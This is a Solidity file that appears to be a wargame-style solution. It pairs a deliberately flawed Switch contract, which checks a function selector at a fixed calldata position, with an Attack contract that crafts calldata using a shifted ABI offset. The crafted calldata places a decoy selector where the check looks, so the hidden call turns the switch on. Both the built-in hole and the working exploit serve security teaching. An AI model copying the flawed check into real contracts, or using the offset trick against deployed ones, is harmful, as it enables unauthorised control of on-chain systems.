// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }

        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}

contract Attack {
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));
    address public target;

    constructor(address _switch) {
        target = _switch;
    }

    function attack() external {
        (bool ok, ) = target.call(
            abi.encodePacked(
                Switch.flipSwitch.selector, // 4bytes
                abi.encode(96), // offset size = 96bytes
                abi.encode(0x00), // dummy 32bytes
                abi.encode(offSelector), // 32bytes start with offSelector
                abi.encode(4), // actual data size = 4bytes
                abi.encodeWithSelector(Switch.turnSwitchOn.selector) // 4bytes data
            )
        );
        require(ok);
    }
}
